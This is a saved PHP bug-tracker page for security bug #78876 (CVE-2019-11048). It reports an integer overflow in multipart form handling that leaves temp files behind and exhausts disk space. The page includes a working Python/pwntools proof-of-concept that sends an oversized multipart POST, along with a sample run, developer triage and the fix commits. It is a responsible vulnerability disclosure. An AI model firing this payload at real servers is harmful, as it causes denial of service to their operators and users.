@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='*Web Server problem Bug #78876 - RDF' href='rss/bug.php?id=78876'>
+        <link rel='alternate' type='application/rss+xml' title='*Web Server problem Bug #78876 - RSS 2.0' href='rss/bug.php?id=78876&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #78876 :: Long variables in multipart/form-data cause OOM and temp files are not cleaned</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=78876">Sec Bug</a>&nbsp;#78876</th>
+            <td id="summary" colspan="5">Long variables in multipart/form-data cause OOM and temp files are not cleaned</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2019-11-28 11:07 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2020-05-11 21:22 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>jr &#x61;&#116; coredu &#x64;&#111;&#x74; mp</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=%2AWeb+Server+problem">*Web Server problem</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>7.2.25</td>
+            <th class="details">OS:</th>
+            <td>ALL</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11048" target="_blank">2019-11048</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=78876&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=78876&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=78876&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1574939256">&nbsp;</a><strong>[2019-11-28 11:07 UTC] jr &#x61;&#116; coredu &#x64;&#111;&#x74; mp</strong>
+<pre class='note'>Description:
+------------
+There is a bug in php-src/main/rfc1867.c that allows a malicious user to crash php during a multipart/form-data file upload. A large multipart/form-data variable causes an integer overflow that leads to a subsequent crash.
+The problem is that if multiple files are uploaded at the same time and the bug is triggered with one of the later files,all previous temp files will not be deleted and fill up the disk. This could be used for a easy to execute remote denial of service attack.
+
+Required php.ini settings:
+
+; post_max_size needs to be at least 2GB + a few additional bytes for the rest of the form (this depends on the exact POC)
+; For the POC attached to this bug report, please use 2147483839 or more.
+post_max_size = 2147483839
+; this could be remotely set with the MAX_FILE_SIZE form variable but in order to keep the POC as simple as possible, I did not do this
+; so set upload_max_filesize to 0
+upload_max_filesize = 0
+; according to documentation, memory_limit should always be larger than post_max_size so I set it to 4GB to be on the safe side
+memory_limit = 4GB
+
+
+The security issue exists in SAPI_API SAPI_POST_HANDLER_FUNC(rfc1867_post_handler) in the handling of large variables:
+
+
+/* Normal form variable, safe to read all data into memory */
+if (!filename &amp;&amp; param) {
+    size_t value_len;
+    char *value = multipart_buffer_read_body(mbuff, &amp;value_len);
+    size_t new_val_len; /* Dummy variable */
+
+    if (!value) {
+        value = estrdup(&quot;&quot;);
+        value_len = 0;
+    }
+
+...
+
+static char *multipart_buffer_read_body(multipart_buffer *self, size_t *len)
+{
+	char buf[FILLUNIT], *out=NULL;
+	int total_bytes=0, read_bytes=0;
+
+	while((read_bytes = multipart_buffer_read(self, buf, sizeof(buf), NULL))) {
+		out = erealloc(out, total_bytes + read_bytes + 1);
+		memcpy(out + total_bytes, buf, read_bytes);
+		total_bytes += read_bytes;
+	}
+
+	if (out) {
+		out[total_bytes] = '\0';
+	}
+	*len = total_bytes;
+
+	return out;
+}
+
+The problem is that the total_bytes variable has the type of a signed integer. If the variable is large enough to overflow it, total_bytes will
+be negative. This causes the erealloc() to fail because it will be converted to a extremely large 64 bit integer.
+Subsequently, the script apruptly exits and the already uploaded temporary files are not deleted.
+
+Example run of attached POC:
+
+root@vagrant:/var/www/html# ls /tmp/php*
+ls: cannot access '/tmp/php*': No such file or directory
+root@vagrant:/var/www/html# python multipart_var_oom_crash.py 
+[+] Opening connection to 127.0.0.1 on port 80: Done
+sending payload with size 2147483839
+[*] Switching to interactive mode
+HTTP/1.1 502 Bad Gateway
+Server: nginx/1.14.0 (Ubuntu)
+Date: Mon, 18 Nov 2019 05:43:50 GMT
+Content-Type: text/html
+Content-Length: 182
+Connection: keep-alive
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;502 Bad Gateway&lt;/title&gt;&lt;/head&gt;
+&lt;body bgcolor=&quot;white&quot;&gt;
+&lt;center&gt;&lt;h1&gt;502 Bad Gateway&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.14.0 (Ubuntu)&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+$ 
+[*] Closed connection to 127.0.0.1 port 80
+root@vagrant:/var/www/html# ls /tmp/php*
+/tmp/php3kyNzA
+root@vagrant:/var/www/html# cat /tmp/php3kyNzA 
+testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttestroot@vagrant:/var/www/html# 
+
+Please note that the python POC requires the pwntools library (pip install pwntools).
+It posts to localhost:80/poc.php - modify the http request if required, the contents of poc.php do not matter.
+
+
+Test script:
+---------------
+#!/usr/bin/env python
+
+from pwn import *
+
+r = remote(&quot;127.0.0.1&quot;, 80)
+
+boundary = &quot;FOO&quot;
+
+def line(s):
+    return &quot;%s\n&quot; %s
+
+buf2 = &quot;&quot;
+buf2 += line(&quot;--&quot;+boundary)
+buf2 += line('Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;test&quot;')
+buf2 += line(&quot;&quot;)
+buf2 += line(&quot;test&quot;*0x10)
+buf2 += line(&quot;--&quot;+boundary)
+buf2 += line('Content-Disposition: form-data; name=&quot;foo&quot;')
+buf2 += line(&quot;&quot;)
+buf2 += line(&quot;a&quot;*0x7FFFFFFF)
+buf2 += line(&quot;--&quot;+boundary+&quot;--&quot;)
+
+buf = &quot;&quot;
+buf += &quot;POST /poc.php HTTP/1.1\n&quot;
+buf += &quot;Host: localhost\n&quot;
+buf += &quot;Content-Type: multipart/form-data; boundary=%s\n&quot; % boundary
+buf += &quot;Content-Length: %d\n&quot; % len(buf2)
+buf += &quot;\n&quot;
+
+print &quot;sending payload with size %d&quot; % len(buf2)
+r.send(buf + buf2)
+r.interactive()
+
+Expected result:
+----------------
+php should not crash, the temporary file should be deleted
+
+Actual result:
+--------------
+php crashes, the temporary file is not deleted
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=78876'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=78876'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1575002070">&nbsp;</a><strong>[2019-11-29 04:34 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Summary: Long variables in multipart/form-data crash PHP and
+          lead to disk exhaustion</span>
+<span class="added">+Summary: Long variables in multipart/form-data cause OOM and
+          temp files are not cleaned</span>
+</div></div></div><div class='comment type_comment' ><a name="1575002070">&nbsp;</a><strong>[2019-11-29 04:34 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Allocation failure strictly speaking is not a crash, but not cleaning up temp file may be indeed bad and cause DOS.
+</pre>
+</div><div class='comment type_log' ><a name="1575002097">&nbsp;</a><strong>[2019-11-29 04:34 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Package: Reproducible crash</span>
+<span class="added">+Package: *Web Server problem</span>
+</div></div></div><div class='comment type_log' ><a name="1576484458">&nbsp;</a><strong>[2019-12-16 08:20 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2019-11048</span>
+</div></div></div><div class='comment type_log' ><a name="1584523758">&nbsp;</a><strong>[2020-03-18 09:29 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status:      Open</span>
+<span class="added">+Status:      Verified</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1584523758">&nbsp;</a><strong>[2020-03-18 09:29 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Suggested fix:
+&lt;<a href="https://gist.github.com/cmb69/384d5f5bb6b2de834877348dcdbe3282" rel="nofollow">https://gist.github.com/cmb69/384d5f5bb6b2de834877348dcdbe3282</a>&gt;.
+
+@jr, could you please confirm that the patch fixes the bug?
+</pre>
+</div><div class='comment type_log' ><a name="1584523840">&nbsp;</a><strong>[2020-03-18 09:30 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status:      Verified</span>
+<span class="added">+Status:      Open</span>
+<span class="removed">-Assigned To: stas</span>
+<span class="added">+Assigned To:</span>
+</div></div></div><div class='comment type_comment' ><a name="1584523840">&nbsp;</a><strong>[2020-03-18 09:30 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Oops, the patch is meant for <a href='bug.php?id=78875'>bug #78875</a>.  Sorry for the noise.
+</pre>
+</div><div class='comment type_log' ><a name="1584525583">&nbsp;</a><strong>[2020-03-18 09:59 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status:      Open</span>
+<span class="added">+Status:      Verified</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1584525583">&nbsp;</a><strong>[2020-03-18 09:59 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Suggested fix for this issue:
+&lt;<a href="https://gist.github.com/cmb69/94d3993ad9e2ee5d2ddabff18f6a86b8" rel="nofollow">https://gist.github.com/cmb69/94d3993ad9e2ee5d2ddabff18f6a86b8</a>&gt;
+
+@jr, could you please confirm that the patch fixes the bug?
+</pre>
+</div><div class='comment type_comment' ><a name="1587455455">&nbsp;</a><strong>[2020-04-21 07:50 UTC] jr &#x61;&#116; coredu &#x64;&#111;&#x74; mp</strong>
+<pre class='note'>Patch looks good, this should fix the crash. Thanks!
+</pre>
+</div><div class='comment type_svn' ><a name="1589232170">&nbsp;</a><strong>[2020-05-11 21:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of cmbecker69@gmx.de
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3c8582ca4b8e84e5647220b647914876d2c3b124" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3c8582ca4b8e84e5647220b647914876d2c3b124</a>
+Log: Fix #78876: Long variables cause OOM and temp files are not cleaned
+</pre>
+</div><div class='comment type_log' ><a name="1589232170">&nbsp;</a><strong>[2020-05-11 21:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Verified</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1589266943">&nbsp;</a><strong>[2020-05-12 07:02 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of cmbecker69@gmx.de
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8fd927768991df88df0c338b2b7c29e490392430" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8fd927768991df88df0c338b2b7c29e490392430</a>
+Log: Fix #78876: Long variables cause OOM and temp files are not cleaned
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
